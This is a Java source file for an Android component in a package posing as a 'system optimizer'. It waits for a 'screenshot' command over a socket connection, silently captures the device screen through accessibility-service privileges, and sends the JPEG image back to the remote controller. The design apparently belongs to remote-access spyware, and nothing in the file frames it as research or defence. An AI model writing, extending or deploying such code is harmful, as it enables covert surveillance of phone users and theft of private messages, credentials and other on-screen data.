package com.system.optimizer.event_handler;

import java.io.ByteArrayOutputStream;

import com.system.optimizer.network.SocketManager;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Bitmap;
import android.graphics.ColorSpace;
import android.hardware.HardwareBuffer;
import android.os.Build;
import androidx.annotation.RequiresApi;

public class ScreenshotEventHandler {
    private static final String TAG = "ScreenshotEventHandler";

    private final AccessibilityService service;

    private final SocketManager socketManager;

    public ScreenshotEventHandler(AccessibilityService delegate, SocketManager socketManager) {
        this.service = delegate;
        this.socketManager = socketManager;
        this.socketManager.addListener("screenshot", args -> onScreenshotRequestEvent());
    }

    @RequiresApi(api = Build.VERSION_CODES.R)
    public void onScreenshotRequestEvent() {
        try {
            service.takeScreenshot(
                    android.view.Display.DEFAULT_DISPLAY,
                    service.getMainExecutor(),
                    new AccessibilityService.TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(AccessibilityService.ScreenshotResult result) {
                            try {
                                HardwareBuffer buffer = result.getHardwareBuffer();
                                ColorSpace colorSpace = result.getColorSpace();
                                if (colorSpace == null) {
                                    colorSpace = ColorSpace.get(ColorSpace.Named.SRGB);
                                }
                                Bitmap bitmap = Bitmap.wrapHardwareBuffer(buffer, colorSpace);
                                buffer.close();
                                byte[] imageData = bitmapToJpegBytes(bitmap);
                                bitmap.recycle();
                                socketManager.sendEvent("screenshot_response", imageData);
                            } catch (Exception e) {
                                socketManager.sendEvent("logger", "Error: " + e.getMessage());
                            }
                        }

                        @Override
                        public void onFailure(int error) {
                            socketManager
                                    .sendEvent("logger", "Screenshot failed with error code: " + error);
                        }
                    });
        } catch (Exception e) {
            socketManager.sendEvent("logger", "Error: " + e.getMessage());
        }
    }

    /**
     * Convert Bitmap to JPEG byte array
     */
    private static byte[] bitmapToJpegBytes(Bitmap bitmap) {
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        bitmap.compress(Bitmap.CompressFormat.JPEG, 70, baos); // 70% quality = good compression
        return baos.toByteArray();
    }
}